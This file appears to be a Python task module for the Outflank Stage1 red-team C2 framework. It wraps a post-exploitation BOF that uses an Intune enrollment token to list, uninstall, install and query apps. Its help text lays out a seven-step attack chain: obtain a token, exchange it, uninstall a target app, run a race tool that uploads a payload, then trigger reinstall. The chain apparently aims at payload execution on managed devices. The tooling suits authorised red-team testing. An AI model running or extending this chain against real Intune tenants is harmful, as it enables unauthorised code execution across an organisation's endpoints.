import os
from typing import Dict, List, Optional, Tuple

from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding
from outflank_stage1.task.exceptions import TaskInvalidArgumentsException


VALID_COMMANDS = ("list", "install", "uninstall", "status")


def _resolve_binary_path():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    if os.path.basename(script_dir).lower() == "ost":
        return os.path.normpath(os.path.join(script_dir, "../pe"))
    return script_dir


class IntuneAppsPEBOF(BaseBOFTask):
    """List, install, uninstall, or check status of Intune apps. BOF-PE version."""

    def __init__(self):
        super().__init__(
            "intune-apps-pe",
            base_binary_name="apps",
            base_binary_path=_resolve_binary_path(),
        )

        self.parser.description = (
            "List, install, uninstall, or check status of Intune apps via "
            "the IWService REST API. Auto-discovers the IWService host and "
            "device ID. Requires an enrollment token from intune-exchange-pe. "
            "BOF-PE version."
        )

        self.parser.add_argument(
            "token",
            help="Enrollment token (from intune-exchange-pe)",
        )
        self.parser.add_argument(
            "command",
            choices=VALID_COMMANDS,
            help="Action to perform",
        )
        self.parser.add_argument(
            "app_guid",
            nargs="?",
            default="",
            help="App GUID (required for install/uninstall/status)",
        )
        self.parser.add_argument(
            "--host",
            default="",
            help="IWService host override (default: auto-discover from IME logs)",
        )

        self.parser.epilog = (
            "Example usage:\n"
            "  intune-apps-pe <token> list\n"
            "  intune-apps-pe <token> status <app-guid>\n"
            "  intune-apps-pe <token> uninstall <app-guid>\n"
            "  intune-apps-pe <token> install <app-guid>\n"
            "  intune-apps-pe <token> list --host fef.xxx.manage.microsoft.com\n\n"
            "Full chain:\n"
            "  1. askwam --client-id 9ba1a5c7-... --scope d4ebce55-.../.default\n"
            "  2. intune-exchange-pe <mam-token>\n"
            "  3. intune-apps-pe <token> list\n"
            "  4. intune-apps-pe <token> uninstall <app-guid>\n"
            "  5. intune-apps-pe <token> status <app-guid>   (wait for ApprovedForInstall)\n"
            "  6. intune-race-pe                              (upload payload, arm watcher)\n"
            "  7. intune-apps-pe <token> install <app-guid>\n\n"
            "Notes:\n"
            "  After uninstall, wait for status to show ApprovedForInstall\n"
            "  before triggering the race + install.\n"
        )

    def validate_arguments(self, arguments: List[str]):
        super().validate_arguments(arguments)
        args = self.parser.parse_args(arguments)

        if args.command != "list" and not args.app_guid:
            raise TaskInvalidArgumentsException(
                f"{args.command} requires an app GUID"
            )

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple[BOFArgumentEncoding, str]]:
        args = self.parser.parse_args(arguments)
        return [
            (BOFArgumentEncoding.STR, args.token),
            (BOFArgumentEncoding.STR, args.command),
            (BOFArgumentEncoding.STR, args.app_guid),
            (BOFArgumentEncoding.STR, args.host),
        ]

    def run(self, arguments: List[str]):
        args = self.parser.parse_args(arguments)
        if args.command == "list":
            self.append_response("[*] Listing Intune apps...\n")
        elif args.command == "status":
            self.append_response(
                f"[*] Checking status of {args.app_guid}...\n"
            )
        else:
            self.append_response(
                f"[*] Sending {args.command} for {args.app_guid}...\n"
            )
        super().run(arguments)

    def get_gui_elements(self) -> Optional[Dict]:
        return None
